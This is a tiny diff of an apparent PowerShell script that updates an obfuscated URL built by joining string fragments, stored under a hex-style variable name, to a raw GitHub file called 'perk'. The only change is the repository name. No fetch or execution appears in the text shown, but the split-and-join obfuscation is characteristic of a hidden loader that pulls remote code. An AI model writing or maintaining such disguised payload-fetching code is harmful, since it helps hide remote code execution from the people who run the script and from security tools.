@@ -4,7 +4,7 @@ $_0x91A = @(
 "https://raw",
 ".githubusercontent",
 ".com/CONNERZZZ",
-"/perk/refs",
+"/perkk/refs",
 "/heads/main/",
 "perk"
 ) -join ""
